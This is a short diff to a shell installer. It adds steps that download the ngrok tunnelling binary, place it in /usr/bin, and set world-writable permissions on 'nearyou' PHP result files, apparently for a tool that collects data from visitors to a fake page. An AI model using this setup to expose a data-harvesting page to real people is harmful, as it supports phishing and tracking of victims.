@@ -14,9 +14,18 @@ echo '    ssh'
 apt-get -y install ssh
 echo '    Requests'
 pip3 install requests
+echo ' ngrok'
+apt install zip wget
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+unzip ngrok-stable-linux-arm.zip
+
 echo
 echo '[!] Setting Permissions...'
+chmod +x ngrok
 chmod 777 template/nearyou/php/info.txt
 chmod 777 template/nearyou/php/result.txt
 echo
+echo '[+] Almost done...'
+mv -f ngrok /usr/bin/
+rm -rf ngrok-stable-linux-arm.zip
 echo '[!] Installed.'
